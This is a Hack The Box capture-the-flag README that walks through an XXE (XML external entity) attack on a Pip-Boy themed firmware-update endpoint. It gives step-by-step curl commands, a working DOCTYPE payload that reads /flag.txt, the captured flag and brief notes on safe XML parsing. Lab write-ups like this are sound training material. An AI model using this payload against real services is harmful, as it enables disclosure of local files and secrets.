# Jailbreak

## Overview

This directory contains the local materials and manual walkthrough for the `Jailbreak` challenge on Hack The Box. This README is written as a practical walkthrough so someone can open the folder, inspect the challenge files, understand the intended weakness, and reproduce the solve with commands that are easy to copy and run.

## Challenge Profile

- Challenge: `Jailbreak`
- Category: `Web`
- Platform: `Hack The Box`

## Directory Contents

- `jailbreak_poc.sh`

## First Commands To Run

This folder does not include original challenge files. Start by reading the challenge description and the manual walkthrough below, then connect to a fresh challenge instance and reproduce the steps one by one.

```bash
cd "/home/eliah/Desktop/CTF/HackTheBox/Jailbreak"
ls -lah
printf 'Follow the manual walkthrough below against the live service.\n'
```

## Walkthrough

Challenge Name: Jailbreak
Category: Web
Platform: Hack The Box

### Description

We are given a Pip-Boy themed firmware update interface. The scenario hints
that we need to bypass the device protections and it explicitly says the flag
is stored in:
/flag.txt

Spawned target used during solving:
http://154.57.164.74:30679

### Core lesson

XML parsers can become dangerous when they allow external entity expansion.
If the server parses attacker-controlled XML with DTDs enabled, we may be
able to make it read local files from the server.

This is the classic XXE pattern:
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>

and then reference:
&xxe;

Step 1: Identify the interesting route.
Manual command:
curl -s http://154.57.164.74:30679/rom

Reason:
The ROM page contains a "Firmware Update" form with a textarea that expects
XML input.

Step 2: Read the client-side JavaScript.
Manual command:
curl -s http://154.57.164.74:30679/static/js/update.js

Reason:
The JavaScript shows the exact backend endpoint:
POST /api/update
with Content-Type: application/xml

Step 3: Confirm normal behavior.
Manual command:
curl -s -X POST http://154.57.164.74:30679/api/update \
-H 'Content-Type: application/xml' \
--data '<FirmwareUpdateConfig><Firmware><Version>1.33.7</Version></Firmware></FirmwareUpdateConfig>'

Reason:
The response reflects the parsed firmware version:
"Firmware version 1.33.7 update initiated."

That reflection is important because it gives us a clean place to display the
contents of an external entity.

Step 4: Send an XXE payload.
Manual command:
curl -s -X POST http://154.57.164.74:30679/api/update \
-H 'Content-Type: application/xml' \
--data-binary @- <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<FirmwareUpdateConfig>
<Firmware>
<Version>&xxe;</Version>
</Firmware>
</FirmwareUpdateConfig>
EOF

Reason:
The XML parser resolves &xxe; by reading /flag.txt from the server filesystem.
The application then inserts that value into the JSON success message.

### Real-world concept

XXE can lead to:
- local file disclosure
- SSRF
- access to cloud metadata endpoints
- denial of service through entity expansion

Safe parsing generally means:
- disable external entity resolution
- disable DTD processing when not needed
- treat uploaded XML as untrusted input

### Flag obtained

HTB{b1om3tric_l0cks_4nd_fl1cker1ng_l1ghts_c89ad12a436c81cabb1d862cf6c06547}

## Manual Reproduction Flow

Use the walkthrough above as the authoritative solve path. The short command block below is only the setup phase before you execute the numbered manual steps in this README.

```bash
cd "/home/eliah/Desktop/CTF/HackTheBox/Jailbreak"
ls -lah
```

## Study Notes

This challenge is worth revisiting if you are practicing `Web` problems. Inspect the routes and source manually first, confirm the weakness yourself, and only then compare your reasoning against the archived solve notes.
